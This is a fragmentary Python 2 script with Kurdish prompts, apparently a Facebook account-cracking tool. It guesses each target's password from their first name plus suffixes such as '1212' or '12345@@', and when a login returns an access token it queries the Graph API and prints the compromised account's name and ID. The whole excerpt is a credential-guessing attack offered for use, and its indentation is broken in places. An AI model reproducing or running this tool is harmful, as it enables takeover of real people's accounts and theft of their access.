...
#### LOGO ####
logo = """
\x1b[31;1m   This Tool Craete by ABUJAHL /\Your id is active
...
while (loop == 'true'):
    ...
    if (username == CorrectUsername):
	    ...
	    time.sleep(2)
            ...
            print " Tkaya la snap daway id w pass bka snap:ITZ_TAMO  "
...
def option():
	...
	if unikers =="":
		...
		print "\x1b[31;1m Tkaya laxotawa sht manus"
		option()
...
def graber():
	...
	print "\x1b[31;1m{2}~~Hack Krdn La Regay ID Xallkawa Frindyan sarw 2000 bet"
	print "\x1b[31;1m{0}~~Chwna Darawa"
	startgrab()

def startgrab():
	peak = raw_input("ABUJAHL>> ")
	if peak=="":
				    ...
				    pass2 = b['first_name'] + '1212'										
			            ...
			            if 'access_token' in q:	
					       ...
					       if 'access_token' in q:	
						       x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                       z = json.loads(x.text)
						       print '\x1b[37;1m Hack Bu Akretawa 100/100'											
				                       print '\x1b[37;1mNAWE >>> '+ b['name']											
				                       print '\x1b[37;1mID kay >>>' + user											
						       ...
						       oks.append(user+pass3)
						           ...
						           pass4 = b['first_name'] + '12345@@'											
						                   ...
						                   x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                                   z = json.loads(x.text)
				                                   print '\x1b[37;1m Hack Bu Akretawa Pubg '											
				                                   print '\x1b[37;1mNAWE >>> '+ b['name']											
				                                   print '\x1b[37;1mID kay >>>' + user											
